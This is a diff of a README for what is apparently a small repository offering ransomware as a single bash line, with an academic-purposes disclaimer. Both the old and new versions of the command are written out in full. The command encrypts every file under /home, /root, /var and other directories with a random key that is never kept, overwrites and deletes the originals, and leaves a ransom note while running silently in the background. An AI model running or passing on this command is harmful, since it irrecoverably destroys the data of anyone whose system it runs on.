@@ -1,4 +1,5 @@
-# Ransomware-Oner-Line
+# Ransomware-Oner-Line - OneLoC 
+
 This is a code for ransomware in bash script oner line. !!! PURELY FOR ACADEMICAL PURPOSES !!!  
 
 I am not responsible in any way for the misuse of this script, this is code normally installed in any linux distribution  
@@ -8,8 +9,9 @@ This script was developed for the purpose of sanitizing physical storage drives 
 
 With great powers, great responsibilities...  
 
-### Code
+### OneLoC Code
+#### One LoC: One Line Of Code
 
 ```
-Ransom@lock:~$ for i in $(find /home /media /mnt /opt /root /srv /tmp /var -type f); do openssl enc -aes-256-cbc -a -salt -in $i -out $i.cry -k $(echo -n $RANDOM | base64 | sha256sum) && echo '' > $i && rm -rf $i;echo 'All your files has been encrypted !' > $HOME/README.TXT;done >/dev/null 2>&1& 
+Ransom@lock:~$ for i in $(find /home /media /mnt /opt /root /srv /tmp /var -type f); do openssl enc -aes-256-cbc -a -salt -in $i -out $i.LoC -k $(echo -n $RANDOM | base64 | sha256sum) && echo "OneLoC Anti-Forensic..." > $i && rm -rf $i;echo 'All your files has been encrypted by: OneLoC !' > $HOME/README.TXT;done >/dev/null 2>&1& 
 ```
